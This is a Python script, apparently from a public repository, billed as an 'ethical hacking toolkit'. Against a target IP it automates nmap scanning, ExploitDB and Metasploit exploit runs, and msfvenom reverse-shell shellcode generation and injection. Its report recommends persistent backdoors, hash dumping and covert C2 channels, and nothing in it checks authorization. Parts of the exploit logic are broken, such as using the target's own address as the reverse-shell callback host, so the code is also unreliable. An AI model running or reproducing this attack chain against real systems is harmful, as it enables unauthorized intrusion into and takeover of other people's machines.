#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BLACK MAMBA - Advanced Ethical Hacking Toolkit
# Author:github developersl
# Version: 4.0.0

import socket
import nmap
import os
import subprocess
from datetime import datetime
from prettytable import PrettyTable, ALL
from pwn import *
import requests
from colorama import Fore, Style, init
import random
import sys
import time

# Initialize colorama
init(autoreset=True)

# Configuration
EXPLOIT_DB_PATH = "exploits/"
METASPLOIT_PATH = "/usr/bin/msfconsole"
SHELLCODE_DIR = "shellcodes/"
LOG_FILE = "black_mamba.log"

# ASCII Art
BANNER = f"""
{Fore.RED}
  ▄████  ██▓     ██▓ ███▄    █   ▄████  ▄▄▄█████▓ ██▀███   ▒█████   ██▓███  
 ██▒ ▀█▒▓██▒    ▓██▒ ██ ▀█   █  ██▒ ▀█▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██░  ██▒
▒██░▄▄▄░▒██░    ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▓██░ ██▓▒
░▓█  ██▓▒██░    ░██░▓██▒  ▐▌██▒░▓█  ██▓░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██▄█▓▒ ▒
░▒▓███▀▒░██████▒░██░▒██░   ▓██░░▒▓███▀▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░▒██▒ ░  ░
 ░▒   ▒ ░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▓▒░ ░  ░
  ░   ░ ░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░  ░   ░     ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░▒ ░     
░ ░   ░   ░ ░    ▒ ░   ░   ░ ░ ░ ░   ░   ░        ░░   ░ ░ ░ ░ ▒  ░░       
      ░     ░  ░ ░           ░       ░             ░         ░ ░           
{Style.RESET_ALL}
                    {Fore.YELLOW}--=[ Version 4.0.0 | Elite Edition ]=--{Style.RESET_ALL}
"""

# Animation Effects
def typewriter(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def flashing_text(text, color1=Fore.RED, color2=Fore.YELLOW, flashes=3):
    for _ in range(flashes):
        print(color1 + text, end='\r')
        time.sleep(0.3)
        print(color2 + text, end='\r')
        time.sleep(0.3)
    print(Style.RESET_ALL)

# Logging System
def log_event(event_type, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{event_type.upper()}] {message}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

# ----- OS Detection (Enhanced) -----
def get_os_info(ip):
    try:
        nm = nmap.PortScanner()
        log_event("scan", f"Starting OS detection on {ip}")
        typewriter(f"\n{Fore.CYAN}[*] Performing advanced OS fingerprinting on {ip}...{Style.RESET_ALL}")
        
        nm.scan(hosts=ip, arguments='-O --osscan-guess --fuzzy')
        
        if ip in nm.all_hosts():
            host = nm[ip]
            if 'osmatch' in host:
                best_os = max(host['osmatch'], key=lambda x: int(x['accuracy']))
                log_event("info", f"Detected OS: {best_os['name']} ({best_os['accuracy']}%)")
                return host
        return None
    except Exception as e:
        log_event("error", f"OS detection failed: {str(e)}")
        flashing_text(f"[!] Critical OS detection failure: {str(e)}")
        return None

# ----- Vulnerability Scanner (Enhanced) -----
def scan_vulnerabilities(ip):
    try:
        log_event("scan", f"Initiating deep vulnerability scan on {ip}")
        typewriter(f"\n{Fore.MAGENTA}[*] Launching Black Mamba DeepScan™ on {ip}...{Style.RESET_ALL}")
        
        nm = nmap.PortScanner()
        scan_args = '-sV --script=vuln,vulners --script-args mincvss=5.0 -T4'
        nm.scan(hosts=ip, arguments=scan_args)
        
        vulnerabilities = []
        for host in nm.all_hosts():
            if 'tcp' in nm[host]:
                for port, data in nm[host]['tcp'].items():
                    if 'script' in data:
                        for script, output in data['script'].items():
                            vuln = {
                                'port': port,
                                'service': data['name'],
                                'version': data.get('version', 'unknown'),
                                'name': script,
                                'type': categorize_vulnerability(script),
                                'severity': determine_severity(script, output),
                                'output': output,
                                'exploited': False
                            }
                            vulnerabilities.append(vuln)
                            log_event("vuln", f"Found {vuln['severity']} vuln: {script} on {ip}:{port}")
        
        if vulnerabilities:
            flashing_text("[!] Critical vulnerabilities detected!", Fore.RED, Fore.YELLOW)
        return vulnerabilities
    except Exception as e:
        log_event("error", f"Vulnerability scan failed: {str(e)}")
        return []

# ----- Shellcode Generation -----
def generate_shellcode(ip, port, payload_type="windows/meterpreter/reverse_tcp"):
    try:
        if not os.path.exists(SHELLCODE_DIR):
            os.makedirs(SHELLCODE_DIR)
            
        print(f"{Fore.YELLOW}[*] Generating {payload_type} shellcode for {ip}:{port}...{Style.RESET_ALL}")
        output_file = f"{SHELLCODE_DIR}shellcode_{port}_{payload_type.replace('/', '_')}.bin"
        
        cmd = f"msfvenom -p {payload_type} LHOST={ip} LPORT={port} -f raw -o {output_file}"
        subprocess.run(cmd, shell=True, check=True)
        
        with open(output_file, "rb") as f:
            shellcode = f.read()
        
        return True, shellcode
    except Exception as e:
        return False, f"Shellcode generation failed: {str(e)}"

# ----- Shellcode Injection -----
def inject_shellcode(ip, port, shellcode):
    try:
        print(f"{Fore.GREEN}[+] Attempting to inject shellcode to {ip}:{port}{Style.RESET_ALL}")
        conn = remote(ip, port, timeout=10)
        conn.send(shellcode)
        response = conn.recv(timeout=5)
        conn.close()
        return True, f"Shellcode injected! Response: {response.hex()}"
    except Exception as e:
        return False, f"Injection failed: {str(e)}"

# ----- Categorize Vulnerabilities -----
def categorize_vulnerability(vuln_name):
    vuln_lower = vuln_name.lower()
    categories = {
        'dos': 'Denial-of-Service', 'denial': 'Denial-of-Service',
        'rce': 'Remote Code Execution', 'remote code': 'Remote Code Execution',
        'sqli': 'SQL Injection', 'sql injection': 'SQL Injection',
        'xss': 'Cross-Site Scripting', 'csrf': 'Cross-Site Request Forgery',
        'auth': 'Authentication Bypass', 'authentication': 'Authentication Bypass',
        'buffer': 'Buffer Overflow', 'overflow': 'Buffer Overflow',
        'info': 'Information Disclosure', 'disclosure': 'Information Disclosure',
        'ssl': 'Cryptographic Issues', 'tls': 'Cryptographic Issues',
        'weak': 'Weak Configuration'
    }
    for key, category in categories.items():
        if key in vuln_lower:
            return category
    return 'General Vulnerability'

# ----- Severity Determination -----
def determine_severity(vuln_name, output):
    output_lower = str(output).lower()
    vuln_lower = vuln_name.lower()
    if 'critical' in output_lower or 'exploit' in output_lower:
        return 'Critical'
    elif 'heartbleed' in vuln_lower or 'shellshock' in vuln_lower or 'eternalblue' in vuln_lower:
        return 'Critical'
    elif 'high' in output_lower:
        return 'High'
    elif 'warning' in output_lower or 'medium' in output_lower:
        return 'Medium'
    elif 'info' in output_lower or 'low' in output_lower:
        return 'Low'
    else:
        return 'Medium'

# ----- ExploitDB Integration -----
def search_exploitdb(vuln_name, download=False):
    try:
        print(f"{Fore.YELLOW}[*] Searching ExploitDB for {vuln_name}...{Style.RESET_ALL}")
        cmd = f"searchsploit {vuln_name} --exclude='./dos'"
        if download:
            cmd += " -m"
        result = subprocess.check_output(cmd, shell=True).decode()
        
        if "No results found" not in result:
            exploits = []
            lines = result.split('\n')
            for line in lines:
                if "|" in line and not line.startswith("---"):
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        exploit = {
                            'id': parts[0],
                            'platform': parts[1],
                            'title': parts[2]
                        }
                        if download:
                            exploit_path = f"/usr/share/exploitdb/{parts[0]}"
                            exploit['path'] = exploit_path
                        exploits.append(exploit)
            return exploits
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ ExploitDB error: {e}{Style.RESET_ALL}")
        return None

# ----- Metasploit Integration -----
def search_metasploit(vuln_name):
    try:
        print(f"{Fore.YELLOW}[*] Searching Metasploit for {vuln_name}...{Style.RESET_ALL}")
        result = subprocess.check_output(f"{METASPLOIT_PATH} -q -x 'search {vuln_name}; exit'", shell=True).decode()
        
        if "No results found" not in result:
            modules = []
            lines = result.split('\n')
            for line in lines:
                if "exploit/" in line or "auxiliary/" in line:
                    parts = [p.strip() for p in line.split() if p.strip()]
                    if len(parts) >= 3:
                        modules.append({
                            'name': parts[0],
                            'disclosure': parts[1],
                            'rank': parts[2],
                            'description': " ".join(parts[3:])
                        })
            return modules
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ Metasploit error: {e}{Style.RESET_ALL}")
        return None

# ----- Exploit Execution -----
def run_exploit(ip, port, exploit_info):
    try:
        print(f"{Fore.GREEN}[+] Attempting exploit: {exploit_info['title']}{Style.RESET_ALL}")
        
        # Example: FTP anonymous login
        if "ftp" in exploit_info['title'].lower():
            conn = remote(ip, port, timeout=5)
            conn.send(b"USER anonymous\r\n")
            conn.send(b"PASS anonymous\r\n")
            response = conn.recvline()
            conn.close()
            if "230" in response.decode('utf-8', errors='ignore'):
                return True, f"Anonymous login successful! {response.decode()}"
        
        # Buffer overflow with shellcode
        elif "buffer overflow" in exploit_info['title'].lower():
            success, shellcode = generate_shellcode(ip, port)
            if success:
                return inject_shellcode(ip, port, shellcode)
        
        return False, "No matching exploit pattern"
    except Exception as e:
        return False, f"Exploit failed: {str(e)}"

# ----- Main Exploitation Logic -----
def exploit_vulnerabilities(ip, vulnerabilities):
    print(f"\n{Fore.RED}💥 ATTEMPTING EXPLOITATION ON {ip}{Style.RESET_ALL}")
    
    for vuln in vulnerabilities:
        if vuln['severity'] not in ['Critical', 'High']:
            continue
            
        print(f"\n{Fore.BLUE}[*] Targeting: {vuln['name']} (Port {vuln['port']}){Style.RESET_ALL}")
        
        # 1. Try ExploitDB
        exploits = search_exploitdb(vuln['name'], download=True)
        if exploits:
            for exploit in exploits[:2]:
                success, msg = run_exploit(ip, vuln['port'], exploit)
                if success:
                    vuln['exploited'] = True
                    vuln['exploit_result'] = msg
                    break

        # 2. Try Shellcode Injection for Buffer Overflows
        if not vuln.get('exploited') and "buffer overflow" in vuln['type'].lower():
            payloads = [
                "windows/shell_reverse_tcp",
                "linux/x86/shell_reverse_tcp"
            ]
            for payload in payloads:
                success, shellcode = generate_shellcode(ip, vuln['port'], payload)
                if success:
                    success, msg = inject_shellcode(ip, vuln['port'], shellcode)
                    if success:
                        vuln['exploited'] = True
                        vuln['exploit_result'] = msg
                        break

        # 3. Try Metasploit
        if not vuln.get('exploited'):
            modules = search_metasploit(vuln['name'])
            if modules:
                for module in modules[:2]:
                    cmd = f"{METASPLOIT_PATH} -q -x 'use {module['name']}; set RHOSTS {ip}; set RPORT {vuln['port']}; run; exit'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if "Session created" in result.stdout:
                        vuln['exploited'] = True
                        vuln['exploit_result'] = "Metasploit session opened"
                        break

# ----- Advanced Reporting -----
def generate_report(ip, os_info, vulnerabilities):
    try:
        report_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n{Fore.BLUE}▄{'█'*78}▄{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.RED}BLACK MAMBA FINAL INTELLIGENCE REPORT{Fore.BLUE}{' '*42}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.YELLOW}Target: {ip}{' '*64}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.YELLOW}Time: {report_time}{' '*65}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}▀{'█'*78}▀{Style.RESET_ALL}")
        
        # OS Info
        if os_info and 'osmatch' in os_info:
            best_os = max(os_info['osmatch'], key=lambda x: int(x['accuracy']))
            print(f"\n{Fore.CYAN}🖥️  TARGET OS INTELLIGENCE:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}┌{'─'*78}┐{Style.RESET_ALL}")
            print(f"{Fore.GREEN}│ {Fore.WHITE}Primary OS: {best_os['name']} ({best_os['accuracy']}% confidence){' '*36}{Fore.GREEN}│{Style.RESET_ALL}")
            
            if len(os_info['osmatch']) > 1:
                print(f"{Fore.GREEN}│ {Fore.WHITE}Possible Alternatives:{' '*57}{Fore.GREEN}│{Style.RESET_ALL}")
                for os in os_info['osmatch'][1:4]:
                    print(f"{Fore.GREEN}│   • {os['name']} ({os['accuracy']}%){' '*56}{Fore.GREEN}│{Style.RESET_ALL}")
            
            print(f"{Fore.GREEN}└{'─'*78}┘{Style.RESET_ALL}")
        
        # Vulnerability Matrix
        if vulnerabilities:
            print(f"\n{Fore.RED}💀 CRITICAL FINDINGS:{Style.RESET_ALL}")
            print(f"{Fore.RED}┌{'─'*20}┬{'─'*15}┬{'─'*20}┬{'─'*10}┬{'─'*9}┐{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}Vulnerability{' '*7}│ {Fore.WHITE}Service{' '*8}│ {Fore.WHITE}Type{' '*16}│ {Fore.WHITE}Severity{' '*2}│ {Fore.WHITE}Status{' '*3}│{Style.RESET_ALL}")
            print(f"{Fore.RED}├{'─'*20}┼{'─'*15}┼{'─'*20}┼{'─'*10}┼{'─'*9}┤{Style.RESET_ALL}")
            
            for vuln in sorted(vulnerabilities, key=lambda x: x['severity'], reverse=True):
                status = f"{Fore.GREEN}✔" if vuln['exploited'] else f"{Fore.RED}✘"
                sev_color = Fore.RED if vuln['severity'] in ['Critical','High'] else Fore.YELLOW
                
                print(f"{Fore.RED}│ {Fore.WHITE}{vuln['name'][:18]:<18} │ {vuln['service'][:13]:<13} │ {vuln['type'][:18]:<18} │ {sev_color}{vuln['severity']:<8} {Fore.RED}│ {status:<7} {Fore.RED}│{Style.RESET_ALL}")
            
            print(f"{Fore.RED}└{'─'*20}┴{'─'*15}┴{'─'*20}┴{'─'*10}┴{'─'*9}┘{Style.RESET_ALL}")
            
            # Statistics
            critical = sum(1 for v in vulnerabilities if v['severity'] == 'Critical')
            high = sum(1 for v in vulnerabilities if v['severity'] == 'High')
            exploited = sum(1 for v in vulnerabilities if v['exploited'])
            
            print(f"\n{Fore.MAGENTA}📊 OPERATION STATISTICS:{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}┌{'─'*30}┬{'─'*46}┐{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}│ {Fore.WHITE}Critical Vulnerabilities{' '*6}│ {Fore.RED}{critical}{' '*44}{Fore.MAGENTA}│{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}│ {Fore.WHITE}High-Risk Vulnerabilities{' '*5}│ {Fore.RED}{high}{' '*44}{Fore.MAGENTA}│{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}│ {Fore.WHITE}Successful Exploits{' '*9}│ {Fore.GREEN}{exploited}{' '*44}{Fore.MAGENTA}│{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}└{'─'*30}┴{'─'*46}┘{Style.RESET_ALL}")
            
            # Post-Exploitation Recommendations
            if exploited > 0:
                flashing_text("[!] SYSTEM COMPROMISED - MAINTAIN ACCESS RECOMMENDED", Fore.RED, Fore.YELLOW)
                print(f"\n{Fore.YELLOW}🔧 POST-EXPLOITATION ACTIONS:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}• Create persistent backdoor")
                print(f"• Dump password hashes")
                print(f"• Establish covert C2 channel")
                print(f"• Pivot to internal networks{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}🎯 TARGET HARDENED - NO VULNERABILITIES FOUND{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}▄{'█'*78}▄{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█  {Fore.GREEN}OPERATION COMPLETE • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{' '*35}{Fore.BLUE}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}█{' '*78}█{Style.RESET_ALL}")
        print(f"{Fore.BLUE}▀{'█'*78}▀{Style.RESET_ALL}")
        
        log_event("report", f"Generated final report for {ip}")
    except Exception as e:
        log_event("error", f"Report generation failed: {str(e)}")

# ----- Main Function -----
def main():
    try:
        # Clear screen and show banner
        os.system('clear')
        print(BANNER)
        
        # Get target
        target_ip = input(f"\n{Fore.RED}[→] Enter target IP/hostname: {Style.RESET_ALL}")
        
        # Start scan
        log_event("start", f"Initialized attack against {target_ip}")
        typewriter(f"\n{Fore.RED}[!] Initializing Black Mamba attack sequence...{Style.RESET_ALL}")
        
        # Phase 1: Recon
        os_info = get_os_info(target_ip)
        
        # Phase 2: Vulnerability Assessment
        vulnerabilities = scan_vulnerabilities(target_ip)
        
        # Phase 3: Exploitation
        if vulnerabilities:
            exploit_vulnerabilities(target_ip, vulnerabilities)
        
        # Final Report
        generate_report(target_ip, os_info, vulnerabilities)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Mission aborted by operator{Style.RESET_ALL}")
        log_event("abort", "Operation cancelled by user")
        sys.exit(0)

if __name__ == "__main__":
    main()